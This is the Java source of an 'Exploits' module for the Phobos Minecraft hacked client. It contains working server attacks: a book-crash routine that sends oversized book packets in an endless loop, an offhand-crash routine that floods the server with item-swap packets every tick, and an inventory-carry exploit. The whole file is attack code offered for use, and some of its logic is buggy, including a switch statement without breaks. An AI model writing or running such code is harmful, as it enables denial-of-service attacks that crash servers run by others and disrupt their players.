package me.earth.phobos.features.modules.misc;

import me.earth.phobos.event.events.PacketEvent;
import me.earth.phobos.features.modules.Module;
import me.earth.phobos.features.setting.Bind;
import me.earth.phobos.features.setting.Setting;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiDownloadTerrain;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.GuiMultiplayer;
import net.minecraft.client.gui.inventory.GuiContainer;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.init.Items;
import net.minecraft.init.SoundEvents;
import net.minecraft.inventory.ClickType;
import net.minecraft.inventory.Slot;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.server.SPacketSoundEffect;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent;
import org.lwjgl.input.Keyboard;

import java.util.Random;
//OMGOMG SKID FROM GLAD!!!
public class Exploits extends Module {

    public Setting<Boolean> illegalCarry = register(new Setting("IllegalCarry", false));
    public Setting<Bind> toXCarry = register(new Setting("ToXCarry", new Bind(-1), v -> illegalCarry.getValue()));
    public Setting<Bind> fromXCarry = register(new Setting("FromXCarry", new Bind(-1), v -> illegalCarry.getValue()));

    public Setting<Boolean> bookCrash = register(new Setting("BookCrash", false));
    public Setting<Mode> mode = register(new Setting("Mode", Mode.WindowClick, v -> bookCrash.getValue()));
    public Setting<Integer> delay = register(new Setting("Delay", 5, 1, 500, v -> bookCrash.getValue()));
    public Setting<Integer> strLength = register(new Setting("Length", 600, 100, 655, v -> bookCrash.getValue()));

    public Setting<Boolean> offhandCrash = register(new Setting("OffhandCrash", false));
    private final Setting<Boolean> antilag = register(new Setting("AntiOffhandCrash", true, v -> offhandCrash.getValue()));
    private final Setting<Boolean> docrash = register(new Setting("Use Offhand Crash", true, v -> offhandCrash.getValue()));
    private final Setting<Integer> loopzz = register(new Setting("Times to loop", 500, 100, 5000, v -> offhandCrash.getValue()));

    private Packet packet;
    private String pages = "";
    private boolean flag = true;

    public Exploits() {
        super("Exploits", "Some expploits", Category.MISC, true, false, false);
    }

    @Override
    public void onEnable(){
        if(bookCrash.getValue()) {
            pages = genRandomString(strLength.getValue());
            runThread();
            flag = true;
        }
    }

    @Override
    public void onDisable(){
        if(bookCrash.getValue()) {
            pages = "";
            flag = false;
        }
    }

    @Override
    public void onUpdate() {
        if(offhandCrash.getValue()) {
            if(docrash.getValue()) {
                for (int i = 0; i < loopzz.getValue(); ++i) {
                    final BlockPos playerBlock = new BlockPos(mc.player.posX, mc.player.posY - 1.0, mc.player.posZ);
                    mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, playerBlock, EnumFacing.UP));
                }
            }
            if (mc.currentScreen instanceof GuiMainMenu ||
                    mc.currentScreen instanceof GuiDisconnected ||
                    mc.currentScreen instanceof GuiDownloadTerrain ||
                    mc.currentScreen instanceof GuiConnecting ||
                    mc.currentScreen instanceof GuiMultiplayer) {
                //disable if disconnected so u dont get kicked immediately on login
                if(this.isEnabled()) {
                    this.toggle();
                }
            }
        }
    }

    @SubscribeEvent
    public void onPacketSend(PacketEvent.Send event) {
        if(offhandCrash.getValue() && antilag.getValue()) {
            SPacketSoundEffect packet;
            if (event.getPacket() instanceof SPacketSoundEffect) {
                packet = event.getPacket();
                if (packet.getSound() == SoundEvents.ITEM_ARMOR_EQUIP_GENERIC) {
                    event.setCanceled(true);
                }
            }
        }
    }

    @Override
    public void onLogout() {
        this.disable();
    }

    @Override
    public void onUnload() {
        this.disable();
    }

    private void runThread(){
        new Thread(() -> {
            try {
                ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                NBTTagList list = new NBTTagList();
                NBTTagCompound tag = new NBTTagCompound();
                String author = mc.getSession().getUsername();

                for (int i = 0; i < 50; i++) {
                    NBTTagString tString = new NBTTagString(pages);
                    list.appendTag(tString);
                }
                tag.setString("author", author);
                tag.setString("title", "\n ZimCRASH \n");
                tag.setTag("pages", list);
                bookObj.setTagInfo("pages", list);
                bookObj.setTagCompound(tag);
                if(mode.getValue() == Mode.ConsoleSpammer){
                    pages = genRandomString(8192);
                    strLength.setValue(8192);
                    delay.setValue(225);
                }
                while(flag) {
                    switch (mode.getValue()){
                        case CreativeInventory:
                            packet = new CPacketCreativeInventoryAction(0, bookObj);
                        case WindowClick:
                            packet = new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
                        case ConsoleSpammer:
                            packet = new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0);
                    }
                    mc.player.connection.sendPacket(packet);
                    try {
                        Thread.sleep(delay.getValue());
                    } catch (Exception e) {
                        Thread.interrupted();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private String genRandomString(Integer Length) {
        String SALTCHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < Length) {
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;
    }

    @SubscribeEvent(priority = EventPriority.NORMAL, receiveCanceled = true)
    public void onKeyInput(InputEvent.KeyInputEvent event) {
        if(illegalCarry.getValue() && Keyboard.getEventKeyState() && mc.currentScreen instanceof GuiContainer) {
            if(toXCarry.getValue().getKey() == Keyboard.getEventKey()) {
                GuiContainer container = (GuiContainer)mc.currentScreen;
                Slot slot = container.getSlotUnderMouse();
                if (slot != null) {
                    mc.playerController.windowClick(container.inventorySlots.windowId, slot.getSlotIndex(), 0, ClickType.PICKUP, mc.player);
                    mc.playerController.windowClick(container.inventorySlots.windowId, -999, 0, ClickType.QUICK_CRAFT, mc.player);
                    mc.playerController.windowClick(0, 1, 1, ClickType.QUICK_CRAFT, mc.player);
                    mc.playerController.windowClick(container.inventorySlots.windowId, -999, 2, ClickType.QUICK_CRAFT, mc.player);
                }
            } else if(fromXCarry.getValue().getKey() == Keyboard.getEventKey()) {
                GuiContainer container = (GuiContainer)mc.currentScreen;
                Slot slot = container.getSlotUnderMouse();
                if (slot != null) {
                    mc.playerController.windowClick(0, 1, 0, ClickType.PICKUP, mc.player);
                    mc.playerController.windowClick(0, -999, 0, ClickType.QUICK_CRAFT, mc.player);
                    mc.playerController.windowClick(container.inventorySlots.windowId, slot.getSlotIndex(), 1, ClickType.QUICK_CRAFT, mc.player);
                    mc.playerController.windowClick(0, -999, 2, ClickType.QUICK_CRAFT, mc.player);
                }
            }
        }
    }

    private enum Mode {
        CreativeInventory, WindowClick, ConsoleSpammer
    }
}
